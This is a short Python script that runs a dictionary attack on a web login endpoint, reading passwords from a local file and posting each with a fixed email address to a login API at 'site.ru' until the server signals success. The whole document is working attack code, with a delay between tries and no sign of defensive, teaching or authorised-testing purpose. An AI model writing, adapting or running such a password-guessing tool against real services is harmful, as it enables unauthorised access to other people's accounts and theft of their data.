import requests
import time

url = 'http://site.ru/api/login'
headers = {'Content-Type': 'application/json'}

with open('C:/Users/IT/Desktop/pass/datas.txt', 'r') as f:
    passwords = f.read().splitlines()

for password in passwords:
    data = {'email': 'mail@mail.ru', 'password': password}
    response = requests.post(url, json=data, headers=headers)
    print(f'{password} - {response.status_code}')
    if response.status_code == 201 and 'id' in response.json() and 'userId' in response.json():
        print('Success!')
        break
    time.sleep(0.2)